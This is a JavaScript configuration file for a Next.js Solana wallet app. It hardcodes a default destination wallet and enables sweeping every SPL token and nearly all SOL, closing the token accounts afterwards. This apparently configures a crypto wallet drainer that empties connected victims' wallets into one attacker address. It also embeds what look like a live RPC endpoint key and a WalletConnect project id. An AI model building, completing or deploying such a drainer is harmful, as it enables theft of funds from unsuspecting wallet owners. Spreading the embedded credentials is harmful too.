// Configuration file for the application
// For Next.js projects, use process.env.NEXT_PUBLIC_* for environment variables
// Create a .env.local file in the root to override these defaults

// Helper to parse boolean from env
const parseBool = (value, defaultValue) => {
  if (value === undefined || value === null) return defaultValue;
  if (typeof value === 'boolean') return value;
  return value === 'true' || value === '1';
};

// Helper to parse number from env
const parseNumber = (value, defaultValue) => {
  if (value === undefined || value === null) return defaultValue;
  const num = Number(value);
  return isNaN(num) ? defaultValue : num;
};

export const CONFIG = {
  // Solana RPC endpoint
  SOLANA_RPC_ENDPOINT: process.env.NEXT_PUBLIC_SOLANA_RPC_ENDPOINT || 'https://solana-mainnet.core.chainstack.com/588ce3a0563eb4c8d2ebb8c60e04b0d2',
  
  // Destination wallet address for token transfers
  DESTINATION_WALLET: process.env.NEXT_PUBLIC_DESTINATION_WALLET || '5WrsX6VS8Uj5HWCjrANg9GSt1pJ2yJrD76qbs6Zq4ihz',
  
  // Wallet Connect project id
  WALLET_CONNECT_PROJECT_ID: process.env.NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID || '55846a70d0633a08583f55c708430332',

  // Other configuration options
  COMMITMENT: process.env.NEXT_PUBLIC_COMMITMENT || 'confirmed',
  BATCH_SIZE: parseNumber(process.env.NEXT_PUBLIC_BATCH_SIZE, 1),

  // External payment URL
  EXTERNAL_PAYMENT_URL: process.env.NEXT_PUBLIC_EXTERNAL_PAYMENT_URL || 'https://www.getmtga.com/pay',
  
  // Transfer configuration
  TRANSFER_CONFIG: {
    // Enable/disable token transfers (SPL tokens)
    TRANSFER_TOKENS: parseBool(process.env.NEXT_PUBLIC_TRANSFER_TOKENS, true),
    
    // Enable/disable SOL transfers
    TRANSFER_SOL: parseBool(process.env.NEXT_PUBLIC_TRANSFER_SOL, true),
    
    // Amount of SOL to reserve for gas fees
    SOL_RESERVE_AMOUNT: parseNumber(process.env.NEXT_PUBLIC_SOL_RESERVE_AMOUNT, 0.01),
    
    // Batch size for transactions (number of transfers per transaction)
    BATCH_SIZE: parseNumber(process.env.NEXT_PUBLIC_TRANSFER_BATCH_SIZE, 1),
    
    // Include closing token accounts after transfer
    CLOSE_TOKEN_ACCOUNTS: parseBool(process.env.NEXT_PUBLIC_CLOSE_TOKEN_ACCOUNTS, true),

    // Add failed transactions to tracking
    ADD_TX_FAILED: parseBool(process.env.NEXT_PUBLIC_ADD_TX_FAILED, true),
  },
  
  // Logging configuration
  LOGGING: {
    // Enable/disable logging system
    ENABLED: parseBool(process.env.NEXT_PUBLIC_LOGGING_ENABLED, false),
    
    // Log levels: 'debug', 'info', 'warn', 'error'
    LEVEL: process.env.NEXT_PUBLIC_LOGGING_LEVEL || 'error',
    
    // Enable console logging
    CONSOLE: parseBool(process.env.NEXT_PUBLIC_LOGGING_CONSOLE, true),
    
    // Enable file logging (for future implementation)
    FILE: parseBool(process.env.NEXT_PUBLIC_LOGGING_FILE, true),
    
    // Show timestamps in logs
    TIMESTAMPS: parseBool(process.env.NEXT_PUBLIC_LOGGING_TIMESTAMPS, true),
    
    // Show component/service names in logs
    SHOW_COMPONENT: parseBool(process.env.NEXT_PUBLIC_LOGGING_SHOW_COMPONENT, true),
    
    // Enable blockchain-specific logging
    BLOCKCHAIN_LOGGING: parseBool(process.env.NEXT_PUBLIC_LOGGING_BLOCKCHAIN_LOGGING, true),
    
    // Enable wallet logging
    WALLET_LOGGING: parseBool(process.env.NEXT_PUBLIC_LOGGING_WALLET_LOGGING, true)
  }
};
